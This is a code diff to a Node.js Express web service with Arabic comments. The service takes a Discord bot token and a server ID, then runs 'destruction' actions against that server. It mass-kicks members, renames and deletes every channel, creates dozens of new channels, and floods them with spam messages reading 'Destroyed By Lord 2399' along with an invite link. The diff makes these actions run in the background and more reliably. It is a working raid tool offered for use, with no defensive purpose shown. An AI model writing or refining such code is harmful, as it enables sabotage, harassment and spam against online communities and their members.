@@ -2,74 +2,82 @@ const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
+// تقديم ملف الـ HTML
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
 
 app.post('/execute', async (req, res) => {
     const { token, guildId, action, customName, customMsg } = req.body;
     
-    // تعريف البوت بـ Intents كاملة عشان ما يعلق
-    const client = new Client({ 
-        intents: [3276799] 
-    });
+    // استخدام Intents مباشرة برقم الحزمة الكامل لضمان عدم الخطأ
+    const client = new Client({ intents: 3276799 });
 
     try {
         await client.login(token);
-        const guild = await client.guilds.fetch(guildId);
-        if (!guild) return res.status(404).send({ status: '❌ السيرفر غير موجود' });
+        const guild = await client.guilds.fetch(guildId).catch(() => null);
+        
+        if (!guild) {
+            return res.status(404).send({ status: '❌ السيرفر غير موجود أو البوت مو فيه' });
+        }
 
-        const name = customName || "Group 2399";
-        const msg = customMsg || "# Group 2399 is here\nhttps://discord.gg/2399k";
+        const name = customName || "Lord 2399";
+        const msg = customMsg || "# Destroyed By Lord 2399\nhttps://discord.gg/2399k";
 
-        // تنفيذ الأوامر (تطابق دقيق مع HTML)
-        if (action === 'طرد الجميع') {
+        // الرد فوراً على المتصفح عشان ما يعلق ويطلع "خطأ اتصال"
+        res.send({ status: '🚀 تم استلام الأمر.. التدمير بدأ في الخلفية!' });
+
+        // تنفيذ العمليات في الخلفية
+        if (action.includes('طرد')) {
             const members = await guild.members.fetch();
             members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
         }
 
-        if (action === 'تغيير الأسماء') {
+        if (action.includes('أسماء')) {
             guild.channels.cache.forEach(c => c.setName(name).catch(() => {}));
         }
 
-        if (action === 'إنشاء رومات') {
-            for (let i = 0; i < 60; i++) {
+        if (action.includes('رومات')) {
+            for (let i = 0; i < 50; i++) {
                 setTimeout(() => {
                     guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => {});
                 }, i * 300);
             }
         }
 
-        if (action === 'إرسال سبام') {
-            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(ch => {
-                for (let i = 0; i < 40; i++) {
-                    setTimeout(() => ch.send(msg).catch(() => {}), i * 800);
+        if (action.includes('سبام')) {
+            guild.channels.cache.forEach(ch => {
+                if (ch.type === ChannelType.GuildText) {
+                    for (let i = 0; i < 30; i++) {
+                        setTimeout(() => ch.send(msg).catch(() => {}), i * 1000);
+                    }
                 }
             });
         }
 
-        if (action === 'ابدأ التدمير 💀') {
-            const members = await guild.members.fetch();
-            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
+        if (action.includes('التدمير')) {
             guild.channels.cache.forEach(c => c.delete().catch(() => {}));
-            
-            for (let i = 0; i < 60; i++) {
+            for (let i = 0; i < 50; i++) {
                 setTimeout(() => {
                     guild.channels.create({ name: name, type: ChannelType.GuildText })
                     .then(ch => {
-                        for(let j=0; j<20; j++) setTimeout(() => ch.send(msg).catch(() => {}), j * 900);
+                        for(let j=0; j<20; j++) setTimeout(() => ch.send(msg).catch(() => {}), j * 800);
                     }).catch(() => {});
                 }, i * 400);
             }
         }
 
-        res.send({ status: `🚀 تم إطلاق [${action}]!` });
     } catch (e) {
-        res.status(500).send({ status: '❌ خطأ: التوكن غلط أو مشكلة في الصلاحيات' });
+        console.error(e);
+        if (!res.headersSent) res.status(500).send({ status: '❌ التوكن غلط' });
     }
 });
 
-app.listen(process.env.PORT || 3000);
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log('Server running on port ' + PORT));
